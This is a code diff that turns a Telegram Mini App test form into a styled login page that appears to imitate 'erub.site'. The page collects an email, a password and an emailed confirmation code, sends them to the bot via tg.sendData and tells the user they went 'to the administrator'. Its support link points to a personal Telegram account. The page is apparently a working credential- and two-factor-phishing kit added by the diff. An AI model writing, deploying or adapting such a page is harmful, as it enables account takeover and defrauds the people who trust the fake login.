@@ -3,98 +3,190 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Тест Mini App</title>
+    <title>Вход в erub.site</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; padding: 20px; max-width: 400px; margin: 0 auto; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
-        button { width: 100%; padding: 12px; background: #667eea; color: white; border: none; border-radius: 5px; cursor: pointer; }
-        #log { margin-top: 10px; padding: 10px; background: #1e1e1e; color: #00ff00; border-radius: 5px; font-size: 12px; font-family: monospace; max-height: 200px; overflow-y: auto; }
-        .status { margin-top: 10px; padding: 10px; background: #f8f9fa; border-radius: 5px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+        h1 { text-align: center; color: #333; margin-bottom: 5px; }
+        .subtitle { text-align: center; color: #666; margin-bottom: 30px; font-size: 14px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 8px; color: #555; font-weight: 500; }
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .btn-primary:hover { transform: translateY(-2px); }
+        .btn-primary:active { transform: translateY(0); }
+        .btn-support {
+            width: 100%;
+            padding: 12px;
+            background: #f5f5f5;
+            color: #333;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn-support:hover { background: #e8e8e8; }
+        .message {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 10px;
+            display: none;
+            text-align: center;
+        }
+        .message.success { display: block; background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .message.error { display: block; background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .message.info { display: block; background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
+        .footer { margin-top: 20px; }
+        #codeForm { margin-top: 20px; display: none; }
     </style>
 </head>
 <body>
-    <h1>🔑 Тест входа</h1>
-    <input type="email" id="email" placeholder="Email" value="test@test.com">
-    <input type="password" id="password" placeholder="Пароль" value="1234">
-    <button onclick="sendData()">📤 Отправить</button>
-    <div id="status" class="status">⏳ Ожидание...</div>
-    <div id="log"></div>
+    <div class="container">
+        <h1>🏠 erub.site</h1>
+        <p class="subtitle">Вход в систему</p>
+        
+        <div id="loginForm">
+            <div class="form-group">
+                <label for="email">📧 Email</label>
+                <input type="email" id="email" placeholder="Введите ваш email">
+            </div>
+            <div class="form-group">
+                <label for="password">🔑 Пароль</label>
+                <input type="password" id="password" placeholder="Введите пароль">
+            </div>
+            <button id="submitBtn" class="btn-primary">🔓 Войти</button>
+        </div>
+
+        <div id="codeForm">
+            <div class="form-group">
+                <label for="codeInput">📧 Код подтверждения</label>
+                <input type="text" id="codeInput" placeholder="Введите код с почты">
+            </div>
+            <button id="submitCodeBtn" class="btn-primary">✅ Подтвердить</button>
+        </div>
+
+        <div id="message" class="message"></div>
+        
+        <div class="footer">
+            <button onclick="openSupport()" class="btn-support">🆘 Техническая поддержка</button>
+        </div>
+    </div>
     
     <script>
-        // Инициализация
         const tg = window.Telegram.WebApp;
         tg.expand();
         
-        const logDiv = document.getElementById('log');
-        const statusDiv = document.getElementById('status');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const codeInput = document.getElementById('codeInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const submitCodeBtn = document.getElementById('submitCodeBtn');
+        const messageDiv = document.getElementById('message');
+        const loginForm = document.getElementById('loginForm');
+        const codeForm = document.getElementById('codeForm');
         
-        function addLog(message, isError = false) {
-            const time = new Date().toLocaleTimeString();
-            logDiv.innerHTML += `<div style="color: ${isError ? '#ff4444' : '#00ff00'}">[${time}] ${message}</div>`;
-            logDiv.scrollTop = logDiv.scrollHeight;
+        function showMessage(text, type = 'info') {
+            messageDiv.textContent = text;
+            messageDiv.className = `message ${type}`;
+            setTimeout(() => { messageDiv.style.display = 'none'; }, 5000);
         }
         
-        addLog('✅ Telegram WebApp инициализирован');
-        addLog(`👤 User ID: ${tg.initDataUnsafe?.user?.id || 'неизвестен'}`);
-        
-        function sendData() {
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value.trim();
-            
-            addLog(`📤 Отправка данных...`);
-            addLog(`📧 Email: ${email}`);
-            addLog(`🔑 Пароль: ${password ? '****' : 'пусто'}`);
+        // Отправка данных
+        submitBtn.addEventListener('click', function() {
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
             
             if (!email || !password) {
-                statusDiv.innerHTML = '❌ Заполните все поля!';
-                addLog('❌ Ошибка: поля не заполнены', true);
+                showMessage('Заполните все поля', 'error');
                 return;
             }
             
-            const data = { email: email, password: password };
-            const jsonData = JSON.stringify(data);
-            addLog(`📦 JSON: ${jsonData}`);
+            const data = JSON.stringify({ email: email, password: password });
             
             try {
-                // ПЕРВЫЙ СПОСОБ: через sendData
-                if (typeof tg.sendData === 'function') {
-                    tg.sendData(jsonData);
-                    addLog('✅ Отправлено через tg.sendData()');
-                    statusDiv.innerHTML = '✅ Данные отправлены!';
-                }
-                
-                // ВТОРОЙ СПОСОБ: через postMessage (для некоторых версий Telegram)
-                if (window.parent) {
-                    window.parent.postMessage(JSON.stringify({
-                        event: 'sendData',
-                        data: jsonData
-                    }), '*');
-                    addLog('✅ Отправлено через postMessage');
-                }
-                
-                // ТРЕТИЙ СПОСОБ: через WebApp.sendData (альтернативный синтаксис)
-                if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.sendData) {
-                    window.Telegram.WebApp.sendData(jsonData);
-                    addLog('✅ Отправлено через WebApp.sendData()');
-                }
-                
-                // ЧЕТВЕРТЫЙ СПОСОБ: через MainButton (если есть)
-                tg.MainButton.setText('Отправлено');
-                tg.MainButton.show();
-                
-                statusDiv.innerHTML = '✅ Данные отправлены всеми способами!';
-                
+                tg.sendData(data);
+                showMessage('✅ Данные отправлены администратору!', 'success');
+                emailInput.value = '';
+                passwordInput.value = '';
             } catch (error) {
-                addLog(`❌ Ошибка: ${error.message}`, true);
-                statusDiv.innerHTML = `❌ Ошибка: ${error.message}`;
+                showMessage('❌ Ошибка отправки', 'error');
             }
+        });
+        
+        // Отправка кода
+        submitCodeBtn.addEventListener('click', function() {
+            const code = codeInput.value.trim();
+            if (!code) {
+                showMessage('Введите код', 'error');
+                return;
+            }
+            
+            try {
+                tg.sendData(JSON.stringify({ code: code }));
+                showMessage('✅ Код отправлен!', 'success');
+                codeInput.value = '';
+                codeForm.style.display = 'none';
+                loginForm.style.display = 'block';
+            } catch (error) {
+                showMessage('❌ Ошибка отправки', 'error');
+            }
+        });
+        
+        // Enter
+        emailInput.addEventListener('keypress', e => { if (e.key === 'Enter') passwordInput.focus(); });
+        passwordInput.addEventListener('keypress', e => { if (e.key === 'Enter') submitBtn.click(); });
+        codeInput.addEventListener('keypress', e => { if (e.key === 'Enter') submitCodeBtn.click(); });
+        
+        function openSupport() {
+            window.open('https://t.me/potok457', '_blank');
         }
         
-        // Отправка по Enter
-        document.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') sendData();
-        });
+        // Показываем форму кода если нужно
+        window.showCodeForm = function() {
+            loginForm.style.display = 'none';
+            codeForm.style.display = 'block';
+            showMessage('Введите код с почты', 'info');
+        };
     </script>
 </body>
 </html>
